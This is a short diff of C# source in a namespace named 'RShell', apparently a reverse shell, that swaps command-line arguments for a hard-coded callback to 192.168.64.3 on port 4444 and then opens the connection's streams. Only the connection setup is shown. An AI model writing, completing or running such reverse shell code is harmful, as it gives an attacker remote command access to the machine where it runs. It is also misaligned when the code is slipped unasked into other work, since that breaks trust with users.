@@ -20,7 +20,7 @@ namespace RShell
             {
                 //Connect to the specified IP and port
                 TcpClient client = new TcpClient();
-                client.Connect(args[0], int.Parse(args[1]));
+                client.Connect("192.168.64.3", 4444);
 
                 //Set up input and output streams
                 Stream stream = client.GetStream();
